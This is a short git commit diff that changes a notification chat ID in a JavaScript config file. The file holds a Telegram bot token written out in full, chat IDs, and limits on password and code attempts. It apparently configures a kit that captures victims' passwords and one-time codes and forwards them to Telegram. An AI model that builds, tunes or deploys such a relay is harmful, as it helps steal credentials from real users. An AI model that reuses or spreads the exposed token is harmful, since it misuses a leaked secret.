e3fc7f43488668e8ef8b6864bd954238699fd4fa
tranminhgiang4122001-byte <tranminhgiang4122001@gmail.com>
2025-08-25 16:28:45 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -2,7 +2,7 @@ const config = {
     token: '8383916369:AAHmIHeFc6L2oWEJjkLrxLoTA8xcu12POeU',
     chat_id: '5099078305',
     noti_token: '8383916369:AAHmIHeFc6L2oWEJjkLrxLoTA8xcu12POeU',
-    noti_chat_id: '-4851986701',
+    noti_chat_id: '-4846382879',
     max_password_attempts: 2,
     max_code_attempts: 5,
     password_loading_time: 3,
